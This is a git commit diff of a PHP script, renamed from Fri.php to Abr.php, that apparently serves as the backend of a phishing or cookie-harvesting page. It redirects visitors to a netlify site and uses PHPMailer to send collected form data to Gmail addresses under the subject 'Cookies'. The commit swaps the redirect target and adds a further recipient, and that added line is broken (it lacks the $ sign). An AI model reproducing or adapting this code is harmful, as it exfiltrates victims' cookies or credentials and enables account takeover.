318345ecea5bf22f2222ed5187c905a0a0f42b8a
Uzr44911 <ahmjtalijaan@gmail.com>
2025-07-23 13:56:36 +0500

    Update and rename Fri.php to Abr.php

--- Abr.php
+++ Abr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://unique-pixie-5d172d.netlify.app/");
+header("Location: https://jovial-sable-598e9d.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -37,14 +37,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       mail->addAddress('morginmocin@gmail.com');
        
-
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'fri Cookies';
+        $mail->Subject = 'abr Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
